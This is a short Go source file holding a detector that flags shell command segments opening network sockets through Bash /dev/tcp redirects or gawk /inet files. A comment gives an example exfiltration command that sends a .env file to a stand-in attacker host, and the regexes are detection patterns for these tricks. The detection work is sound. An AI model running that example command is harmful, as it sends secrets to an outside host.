package classify

import (
	"regexp"
	"strings"
)

// Bash and ksh open a TCP or UDP connection when a redirect names /dev/tcp/host/port or
// /dev/udp/host/port, so "cat .env > /dev/tcp/evil.test/443" sends a file with no network tool in
// sight. The path does not exist on disk: only a redirect opens it, so only a redirect counts.
// gawk does the same with "/inet/tcp/lport/host/rport" as a file name, inside its own code.
var (
	devSocketRedirect = regexp.MustCompile(`[<>]&?\s*/dev/(?:tcp|udp)/[^/\s]+/`)
	gawkInetFile      = regexp.MustCompile(`/inet[46]?/(?:tcp|udp)/[0-9]+/[^/\s'"]+/`)
)

// opensSocket says whether seg connects through one of those special files.
func opensSocket(seg string) bool {
	// Both patterns need a literal "/dev/" or "/inet", and match case as written, so a segment
	// without either is not scanned: most are prose or ordinary commands.
	if !strings.Contains(seg, "/dev/") && !strings.Contains(seg, "/inet") {
		return false
	}
	return devSocketRedirect.MatchString(seg) || gawkInetFile.MatchString(seg)
}
